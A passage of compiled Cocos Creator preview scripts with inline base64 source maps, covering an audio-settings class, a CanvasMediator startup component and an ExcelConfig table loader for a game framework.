yZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gTGVhcm4gQXR0cmlidXRlOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuXHJcblxyXG5cclxuaW1wb3J0IHtMb2NhbFN0b3JhZ2V9IGZyb20gXCIuLi9wZXJzaXN0ZW5jZS9Mb2NhbFN0b3JhZ2VcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuY29uc3QgbXVzaWNDbG9zZUtleSA9IFwibXVzaWNPcGVuXCI7XHJcbmNvbnN0IHNmeENsb3NlS2V5ID0gXCJzZnhPcGVuXCI7XHJcblxyXG5leHBvcnQgY2xhc3MgTXVzaWN7XHJcblxyXG4gICAgLyoqIOivu+WPluacrOWcsOaMgeS5heWMlu+8je+8jeWIneWni+WMliAqL1xyXG4gICAgc3RhdGljIGluaXQoKXtcclxuICAgICAgICBNdXNpYy5zZXRNdXNpY09wZW4oIUxvY2FsU3RvcmFnZS5nZXRCb29sZWFuKG11c2ljQ2xvc2VLZXkpKTtcclxuICAgICAgICBNdXNpYy5zZnhPcGVuID0gIUxvY2FsU3RvcmFnZS5nZXRCb29sZWFuKHNmeENsb3NlS2V5KTtcclxuICAgICAgICAvLyBjYy5hdWRpb0VuZ2luZS5zZXRNdXNpY1ZvbHVtZSgwLjEpO1xyXG4gICAgICAgIC8vIGNjLmF1ZGlvRW5naW5lLnNldEVmZmVjdHNWb2x1bWUoMC4xKTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5pys5Zyw5oyB5LmF5YyWICovXHJcbiAgICBzdGF0aWMgcGVyc2lzdGVuY2UoKXtcclxuICAgICAgICBMb2NhbFN0b3JhZ2Uuc2V0Qm9vbGVhbihtdXNpY0Nsb3NlS2V5LCAhdGhpcy5fbXVzaWNPcGVuKTtcclxuICAgICAgICBMb2NhbFN0b3JhZ2Uuc2V0Qm9vbGVhbihzZnhDbG9zZUtleSwgIXRoaXMuc2Z4T3Blbik7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOiuvue9ruiDjOaZr+mfs+S5kOmfs+mHjyAqL1xyXG4gICAgcHJpdmF0ZSBzdGF0aWMgX2JnbVZvbHVtZTpudW1iZXIgPSAwLjc7XHJcblxyXG4gICAgc3RhdGljIHNldEJnbVZvbHVtZSh2YWw6bnVtYmVyKSB7XHJcbiAgICAgICAgdGhpcy5fYmdtVm9sdW1lID0gdmFsO1xyXG4gICAgICAgIHRoaXMudXBkYXRlVm9sdWUoKTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgZ2V0QmdtVm9sdW1lKCkge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9iZ21Wb2x1bWU7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBzdGF0aWMgdXBkYXRlVm9sdWUoKSB7XHJcbiAgICAgICAgaWYgKHRoaXMuYmdtQXVkaW9JRCA+IDApe1xyXG4gICAgICAgICAgICBjYy5hdWRpb0VuZ2luZS5zZXRWb2x1bWUodGhpcy5iZ21BdWRpb0lELCB0aGlzLl9iZ21Wb2x1bWUpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICAvKiog6K6+572u6Z+z5pWI6Z+z6YePICovXHJcbiAgICBzdGF0aWMgc2Z4Vm9sdW1lOm51bWJlciA9IDE7XHJcblxyXG4gICAgLyoqIOiDjOaZr+mfs+S5kOW8gOWFsyAqL1xyXG4gICAgcHJpdmF0ZSBzdGF0aWMgX211c2ljT3BlbiA9IHRydWU7XHJcbiAgICBzdGF0aWMgc2V0TXVzaWNPcGVuKHZhbDpib29sZWFuKXtcclxuICAgICAgICB0aGlzLl9tdXNpY09wZW4gPSB2YWw7XHJcbiAgICAgICAgaWYgKHZhbCl7XHJcbiAgICAgICAgICAgIHRoaXMucGxheUJHTSgpO1xyXG4gICAgICAgICAgICB0aGlzLnVwZGF0ZVZvbHVlKCk7XHJcbiAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgdGhpcy5zdG9wQkdNKCk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG4gICAgc3RhdGljIGdldE11c2ljT3BlbigpIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5fbXVzaWNPcGVuO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKiDpn7PmlYjlvIDlhbMgKi9cclxuICAgIHN0YXRpYyBzZnhPcGVuOmJvb2xlYW4gPSB0cnVlO1xyXG5cclxuICAgIC8qKiDmkq3mlL7og4zmma/pn7PkuZAgKi9cclxuICAgIHByaXZhdGUgc3RhdGljIF9iZ21QYXRoID0gbnVsbDtcclxuICAgIHN0YXRpYyBhc3luYyBzZXRCZ20odmFsOnN0cmluZykge1xyXG4gICAgICAgIHRoaXMuX2JnbVBhdGggPSB2YWw7XHJcbiAgICAgICAgdGhpcy5wbGF5QkdNKCk7XHJcbiAgICB9XHJcbiAgICBwcml2YXRlIHN0YXRpYyBiZ21BdWRpb0lEOm51bWJlciA9IC0xO1xyXG5cclxuXHJcbiAgICBzdGF0aWMgYXN5bmMgcGxheUJHTSgpe1xyXG4gICAgICAgIC8vIGNvbnNvbGUubG9nKFwicGxheUJHTVwiKTtcclxuICAgICAgICBpZih0aGlzLl9tdXNpY09wZW4gPT0gdHJ1ZSAmJiB0aGlzLl9iZ21QYXRoKXtcclxuICAgICAgICAgICAgbGV0IGF1ZGlvQ2xpcCA9IGF3YWl0IGNjLmxvYWRlci5sb2FkUmVzQXdhaXQodGhpcy5fYmdtUGF0aCwgY2MuQXVkaW9DbGlwKTtcclxuICAgICAgICAgICAgaWYodGhpcy5iZ21BdWRpb0lEID49IDApe1xyXG4gICAgICAgICAgICAgICAgY2MuYXVkaW9FbmdpbmUuc3RvcCh0aGlzLmJnbUF1ZGlvSUQpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIHRoaXMuYmdtQXVkaW9JRCA9IGNjLmF1ZGlvRW5naW5lLnBsYXkoYXVkaW9DbGlwLHRydWUsdGhpcy5fYmdtVm9sdW1lKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIHN0b3BCR00oKXtcclxuICAgICAgICBpZih0aGlzLmJnbUF1ZGlvSUQgPj0gMCl7XHJcbiAgICAgICAgICAgIGNjLmF1ZGlvRW5naW5lLnN0b3AodGhpcy5iZ21BdWRpb0lEKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOaSreaUvumfs+aViCAqL1xyXG4gICAgc3RhdGljIGFzeW5jIHBsYXlTRlgobmFtZTpzdHJpbmd8Y2MuQXVkaW9DbGlwLCBzZnhWb2x1bWU/Om51bWJlcil7XHJcbiAgICAgICAgLy8gY29uc29sZS5sb2coXCJwbGF5U0ZYPT09PlwiLCBuYW1lKTtcclxuICAgICAgICBpZih0aGlzLnNmeE9wZW4gPT0gdHJ1ZSl7XHJcbiAgICAgICAgICAgIGxldCBhdWRpb0NsaXAgPSBudWxsO1xyXG4gICAgICAgICAgICBpZiAodHlwZW9mIG5hbWUgPT0gXCJzdHJpbmdcIil7XHJcbiAgICAgICAgICAgICAgICBhdWRpb0NsaXAgPSBhd2FpdCBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KG5hbWUsIGNjLkF1ZGlvQ2xpcCk7XHJcbiAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgIGF1ZGlvQ2xpcCA9IG5hbWU7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgcmV0dXJuIGNjLmF1ZGlvRW5naW5lLnBsYXkoYXVkaW9DbGlwLGZhbHNlLHNmeFZvbHVtZSB8fCB0aGlzLnNmeFZvbHVtZSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuXHJcbiAgICBzdGF0aWMgcGF1c2VBbGwoKXtcclxuICAgICAgICBjYy5hdWRpb0VuZ2luZS5wYXVzZUFsbCgpO1xyXG4gICAgfVxyXG5cclxuICAgIHN0YXRpYyByZXN1bWVBbGwoKXtcclxuICAgICAgICBjYy5hdWRpb0VuZ2luZS5yZXN1bWVBbGwoKTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgc3RvcEFsbCgpe1xyXG4gICAgICAgIGNjLmF1ZGlvRW5naW5lLnN0b3BBbGwoKTtcclxuICAgIH1cclxuXHJcblxyXG59Il19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/component/CanvasMediator.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '349a5CzWoFFmqjGbjcw5R0A', 'CanvasMediator');
// framework/component/CanvasMediator.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Facade_1 = require("../facade/Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property, menu = _a.menu, executionOrder = _a.executionOrder, requireComponent = _a.requireComponent;
var bLaunch = false;
var CanvasMediator = /** @class */ (function (_super) {
    __extends(CanvasMediator, _super);
    function CanvasMediator() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.scenePrefab = null;
        return _this;
    }
    CanvasMediator.prototype.onLoad = function () {
        return __awaiter(this, void 0, void 0, function () {
            var node, result;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        // console.log(this);
                        Facade_1.default.canvasNode = this.node;
                        if (this.scenePrefab) {
                            node = cc.instantiate(this.scenePrefab);
                            node.setParent(this.node);
                        }
                        if (!!bLaunch) return [3 /*break*/, 2];
                        return [4 /*yield*/, Facade_1.default.executeCommand("StartupCommand")];
                    case 1:
                        result = (_a.sent())[0];
                        if (result) {
                            console.log("程序启动成功...");
                        }
                        else {
                            console.log("程序启动失败!!!");
                        }
                        bLaunch = true;
                        _a.label = 2;
                    case 2: return [2 /*return*/];
                }
            });
        });
    };
    CanvasMediator.prototype.onDestroy = function () {
        Facade_1.default.canvasNode = null;
    };
    __decorate([
        property(cc.Prefab)
    ], CanvasMediator.prototype, "scenePrefab", void 0);
    CanvasMediator = __decorate([
        ccclass,
        menu("自定义/CanvasMediator"),
        requireComponent(cc.Canvas),
        executionOrder(-10)
    ], CanvasMediator);
    return CanvasMediator;
}(cc.Component));
exports.default = CanvasMediator;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29tcG9uZW50L0NhbnZhc01lZGlhdG9yLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFBQSwyQ0FBc0M7QUFFaEMsSUFBQSxLQUE4RCxFQUFFLENBQUMsVUFBVSxFQUExRSxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQUEsRUFBRSxJQUFJLFVBQUEsRUFBRSxjQUFjLG9CQUFBLEVBQUUsZ0JBQWdCLHNCQUFpQixDQUFDO0FBRWxGLElBQUksT0FBTyxHQUFHLEtBQUssQ0FBQztBQU9wQjtJQUE0QyxrQ0FBWTtJQUF4RDtRQUFBLHFFQTJCQztRQXhCRyxpQkFBVyxHQUFhLElBQUksQ0FBQzs7SUF3QmpDLENBQUM7SUF0QlMsK0JBQU0sR0FBWjs7Ozs7O3dCQUNJLHFCQUFxQjt3QkFDckIsZ0JBQU0sQ0FBQyxVQUFVLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQzt3QkFDOUIsSUFBSSxJQUFJLENBQUMsV0FBVyxFQUFDOzRCQUNiLElBQUksR0FBRyxFQUFFLENBQUMsV0FBVyxDQUFDLElBQUksQ0FBQyxXQUFXLENBQUMsQ0FBQzs0QkFDNUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLENBQUM7eUJBQzdCOzZCQUNHLENBQUMsT0FBTyxFQUFSLHdCQUFRO3dCQUNPLHFCQUFNLGdCQUFNLENBQUMsY0FBYyxDQUFDLGdCQUFnQixDQUFDLEVBQUE7O3dCQUF2RCxNQUFNLEdBQUksQ0FBQSxTQUE2QyxDQUFBLEdBQWpEO3dCQUNYLElBQUksTUFBTSxFQUFDOzRCQUNQLE9BQU8sQ0FBQyxHQUFHLENBQUMsV0FBVyxDQUFDLENBQUM7eUJBQzVCOzZCQUFNOzRCQUNILE9BQU8sQ0FBQyxHQUFHLENBQUMsV0FBVyxDQUFDLENBQUM7eUJBQzVCO3dCQUNELE9BQU8sR0FBRyxJQUFJLENBQUM7Ozs7OztLQUV0QjtJQUVELGtDQUFTLEdBQVQ7UUFDSSxnQkFBTSxDQUFDLFVBQVUsR0FBRyxJQUFJLENBQUM7SUFDN0IsQ0FBQztJQXRCRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDO3VEQUNTO0lBSFosY0FBYztRQUpsQyxPQUFPO1FBQ1AsSUFBSSxDQUFDLG9CQUFvQixDQUFDO1FBQzFCLGdCQUFnQixDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUM7UUFDM0IsY0FBYyxDQUFDLENBQUMsRUFBRSxDQUFDO09BQ0MsY0FBYyxDQTJCbEM7SUFBRCxxQkFBQztDQTNCRCxBQTJCQyxDQTNCMkMsRUFBRSxDQUFDLFNBQVMsR0EyQnZEO2tCQTNCb0IsY0FBYyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbImltcG9ydCBGYWNhZGUgZnJvbSBcIi4uL2ZhY2FkZS9GYWNhZGVcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eSwgbWVudSwgZXhlY3V0aW9uT3JkZXIsIHJlcXVpcmVDb21wb25lbnR9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbmxldCBiTGF1bmNoID0gZmFsc2U7XHJcblxyXG5cclxuQGNjY2xhc3NcclxuQG1lbnUoXCLoh6rlrprkuYkvQ2FudmFzTWVkaWF0b3JcIilcclxuQHJlcXVpcmVDb21wb25lbnQoY2MuQ2FudmFzKVxyXG5AZXhlY3V0aW9uT3JkZXIoLTEwKVxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBDYW52YXNNZWRpYXRvciBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLlByZWZhYilcclxuICAgIHNjZW5lUHJlZmFiOmNjLlByZWZhYiA9IG51bGw7XHJcblxyXG4gICAgYXN5bmMgb25Mb2FkICgpIHtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyh0aGlzKTtcclxuICAgICAgICBGYWNhZGUuY2FudmFzTm9kZSA9IHRoaXMubm9kZTtcclxuICAgICAgICBpZiAodGhpcy5zY2VuZVByZWZhYil7XHJcbiAgICAgICAgICAgIGxldCBub2RlID0gY2MuaW5zdGFudGlhdGUodGhpcy5zY2VuZVByZWZhYik7XHJcbiAgICAgICAgICAgIG5vZGUuc2V0UGFyZW50KHRoaXMubm9kZSk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGlmICghYkxhdW5jaCl7XHJcbiAgICAgICAgICAgIGxldCBbcmVzdWx0XSA9IGF3YWl0IEZhY2FkZS5leGVjdXRlQ29tbWFuZChcIlN0YXJ0dXBDb21tYW5kXCIpO1xyXG4gICAgICAgICAgICBpZiAocmVzdWx0KXtcclxuICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKFwi56iL5bqP5ZCv5Yqo5oiQ5YqfLi4uXCIpO1xyXG4gICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgY29uc29sZS5sb2coXCLnqIvluo/lkK/liqjlpLHotKUhISFcIik7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgYkxhdW5jaCA9IHRydWU7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIG9uRGVzdHJveSgpe1xyXG4gICAgICAgIEZhY2FkZS5jYW52YXNOb2RlID0gbnVsbDtcclxuICAgIH1cclxuXHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/config/ExcelConfig.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '0859agupcZJ8aoG/BCnvbwF', 'ExcelConfig');
// framework/config/ExcelConfig.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.ExcelConfig = void 0;
function data2Json(str) {
    var d = str;
    //转换数据
    //第二排是key 把key提出来
    var keys = d.splice(0, 1);
    var temp1 = [];
    for (var i in keys[0]) {
        temp1[i] = keys[0][i];
    }
    //合并的数据
    var newData = [];
    for (var i in d) {
        var temp2 = d[i];
        newData[i] = {};
        for (var j in temp2) {
            var key = temp1[j];
            var val = null;
            val = temp2[j];
            newData[i][key] = val;
        }
    }
    return newData;
}
var excelTables = new Map();
var ExcelConfig = /** @class */ (function () {
    function ExcelConfig() {
    }
    ExcelConfig.loadAllExcel = function (excelDir, progressCallback) {
        return __awaiter(this, void 0, void 0, function () {
            var _a, objects, urls, i, json;
            return __generator(this, function (_b) {
                switch (_b.label) {
                    case 0: return [4 /*yield*/, cc.loader.loadResDirAwait(excelDir, progressCallback)];
                    case 1:
                        _a = _b.sent(), objects = _a[0], urls = _a[1];
                        for (i = 0; i < objects.length; i++) {
                            json = objects[i];
                            if (typeof objects[i].json != "undefined") {
                                json = objects[i].json;
                            }
                            excelTables.set(urls[i], data2Json(json));
                        }
                        return [2 /*return*/];
                }
            });
        });
    };
    ExcelConfig.loadExcel = function (filePath) {
        return __awaiter(this, void 0, void 0, function () {
            var object, json, dataArr;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0: return [4 /*yield*/, cc.loader.loadResAwait(filePath)];
                    case 1:
                        object = _a.sent();
                        json = object;
                        if (typeof object.json != "undefined") {
                            json = object.json;
                        }
                        dataArr = data2Json(json);
                        excelTables.set(filePath, dataArr);
                        return [2 /*return*/];
                }
            });
        });
    };
    ExcelConfig.getExcelTable = function (filePath) {
        return excelTables.get(filePath);
    };
    ExcelConfig.getExcelLine = function (filePath, key, findValue) {
        var array = this.getExcelTable(filePath);
        for (var index in array) {
            if (array[index][key] == findValue) {
                return array[index];
            }
        }
        return null;
    };
    return ExcelConfig;
}());
exports.ExcelConfig = ExcelConfig;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOzs7QUFJbkcsU0FBUyxTQUFTLENBQUMsR0FBUztJQUN4QixJQUFJLENBQUMsR0FBVSxHQUFHLENBQUM7SUFDbkIsTUFBTTtJQUNOLGlCQUFpQjtJQUNqQixJQUFJLElBQUksR0FBRyxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsRUFBQyxDQUFDLENBQUMsQ0FBQztJQUN6QixJQUFJLEtBQUssR0FBRyxFQUFFLENBQUM7SUFDZixLQUFJLElBQUksQ0FBQyxJQUFJLElBQUksQ0FBQyxDQUFDLENBQUMsRUFBQztRQUNqQixLQUFLLENBQUMsQ0FBQyxDQUFDLEdBQUcsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0tBQ3pCO0lBQ0QsT0FBTztJQUNQLElBQUksT0FBTyxHQUFHLEVBQUUsQ0FBQztJQUNqQixLQUFJLElBQUksQ0FBQyxJQUFJLENBQUMsRUFBQztRQUNYLElBQUksS0FBSyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztRQUNqQixPQUFPLENBQUMsQ0FBQyxDQUFDLEdBQUcsRUFBRSxDQUFDO1FBQ2hCLEtBQUksSUFBSSxDQUFDLElBQUksS0FBSyxFQUFDO1lBQ2YsSUFBSSxHQUFHLEdBQUcsS0FBSyxDQUFDLENBQUMsQ0FBQyxDQUFDO1lBQ25CLElBQUksR0FBRyxHQUFHLElBQUksQ0FBQztZQUNmLEdBQUcsR0FBRyxLQUFLLENBQUMsQ0FBQyxDQUFDLENBQUM7WUFDZixPQUFPLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLEdBQUcsR0FBRyxDQUFDO1NBQ3pCO0tBQ0o7SUFDRCxPQUFPLE9BQU8sQ0FBQztBQUNuQixDQUFDO0FBRUQsSUFBSSxXQUFXLEdBQUcsSUFBSSxHQUFHLEVBQWlCLENBQUM7QUFFM0M7SUFBQTtJQW1DQSxDQUFDO0lBbENnQix3QkFBWSxHQUF6QixVQUEwQixRQUFlLEVBQUUsZ0JBQWtGOzs7Ozs0QkFDbkcscUJBQU0sRUFBRSxDQUFDLE1BQU0sQ0FBQyxlQUFlLENBQUMsUUFBUSxFQUFFLGdCQUFnQixDQUFDLEVBQUE7O3dCQUE3RSxLQUFrQixTQUEyRCxFQUE1RSxPQUFPLFFBQUEsRUFBRSxJQUFJLFFBQUE7d0JBQ2xCLEtBQVMsQ0FBQyxHQUFDLENBQUMsRUFBRSxDQUFDLEdBQUMsT0FBTyxDQUFDLE1BQU0sRUFBRSxDQUFDLEVBQUUsRUFBQzs0QkFDNUIsSUFBSSxHQUFHLE9BQU8sQ0FBQyxDQUFDLENBQUMsQ0FBQzs0QkFDdEIsSUFBSSxPQUFPLE9BQU8sQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLElBQUksV0FBVyxFQUFDO2dDQUN0QyxJQUFJLEdBQUcsT0FBTyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQzs2QkFDMUI7NEJBQ0QsV0FBVyxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLEVBQUUsU0FBUyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUM7eUJBQzdDOzs7OztLQUNKO0lBRVkscUJBQVMsR0FBdEIsVUFBdUIsUUFBZTs7Ozs7NEJBQ3JCLHFCQUFNLEVBQUUsQ0FBQyxNQUFNLENBQUMsWUFBWSxDQUFDLFFBQVEsQ0FBQyxFQUFBOzt3QkFBL0MsTUFBTSxHQUFHLFNBQXNDO3dCQUMvQyxJQUFJLEdBQUcsTUFBTSxDQUFDO3dCQUNsQixJQUFJLE9BQU8sTUFBTSxDQUFDLElBQUksSUFBSSxXQUFXLEVBQUM7NEJBQ2xDLElBQUksR0FBRyxNQUFNLENBQUMsSUFBSSxDQUFDO3lCQUN0Qjt3QkFDRyxPQUFPLEdBQUUsU0FBUyxDQUFDLElBQUksQ0FBQyxDQUFDO3dCQUM3QixXQUFXLENBQUMsR0FBRyxDQUFDLFFBQVEsRUFBRSxPQUFPLENBQUMsQ0FBQzs7Ozs7S0FDdEM7SUFFTSx5QkFBYSxHQUFwQixVQUFxQixRQUFlO1FBQ2hDLE9BQU8sV0FBVyxDQUFDLEdBQUcsQ0FBQyxRQUFRLENBQUMsQ0FBQztJQUNyQyxDQUFDO0lBRU0sd0JBQVksR0FBbkIsVUFBb0IsUUFBZSxFQUFFLEdBQVUsRUFBRSxTQUFhO1FBQzFELElBQUksS0FBSyxHQUFHLElBQUksQ0FBQyxhQUFhLENBQUMsUUFBUSxDQUFDLENBQUM7UUFDekMsS0FBSyxJQUFJLEtBQUssSUFBSSxLQUFLLEVBQUM7WUFDcEIsSUFBSSxLQUFLLENBQUMsS0FBSyxDQUFDLENBQUMsR0FBRyxDQUFDLElBQUksU0FBUyxFQUFDO2dCQUMvQixPQUFPLEtBQUssQ0FBQyxLQUFLLENBQUMsQ0FBQzthQUN2QjtTQUNKO1FBQ0QsT0FBTyxJQUFJLENBQUM7SUFDaEIsQ0FBQztJQUNMLGtCQUFDO0FBQUQsQ0FuQ0EsQUFtQ0MsSUFBQTtBQW5DWSxrQ0FBVyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuXHJcblxyXG5mdW5jdGlvbiBkYXRhMkpzb24oc3RyOkFycmF5KXtcclxuICAgIGxldCBkOkFycmF5ID0gIHN0cjtcclxuICAgIC8v6L2s5o2i5pWw5o2uXHJcbiAgICAvL+esrOS6jOaOkuaYr2tleSDmioprZXnmj5Dlh7rmnaVcclxuICAgIGxldCBrZXlzID0gZC5zcGxpY2UoMCwxKTtcclxuICAgIGxldCB0ZW1wMSA9IFtdO1xyXG4gICAgZm9yKGxldCBpIGluIGtleXNbMF0pe1xyXG4gICAgICAgIHRlbXAxW2ldID0ga2V5c1swXVtpXTtcclxuICAgIH1cclxuICAgIC8v5ZCI5bm